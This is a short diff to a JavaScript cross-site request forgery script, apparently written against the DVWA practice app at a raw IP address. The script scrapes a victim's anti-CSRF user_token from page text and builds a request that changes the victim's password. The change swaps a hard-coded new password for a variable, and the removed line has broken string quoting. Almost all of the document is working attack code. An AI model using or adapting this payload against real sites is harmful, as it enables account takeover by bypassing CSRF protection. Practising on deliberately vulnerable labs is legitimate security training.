@@ -14,7 +14,7 @@ xmlhttp.onreadystatechange=function(){
         var regex = /user_token\' value\=\'(.*?)\' \/\>/;
         var match = text.match(regex);
         var token = match[1];
-        var new_url = 'http://52.74.248.115/vulnerabilities/csrf/?user_token='+token+'&password_new='anggi'&password_conf='anggi'&Change=Change'
+        var new_url = 'http://52.74.248.115/vulnerabilities/csrf/?user_token='+token+'&password_new='+pass+'&password_conf='+pass+'&Change=Change'
         if(!hacked){
             alert('Got token:' + match[1]);
             hacked = true;
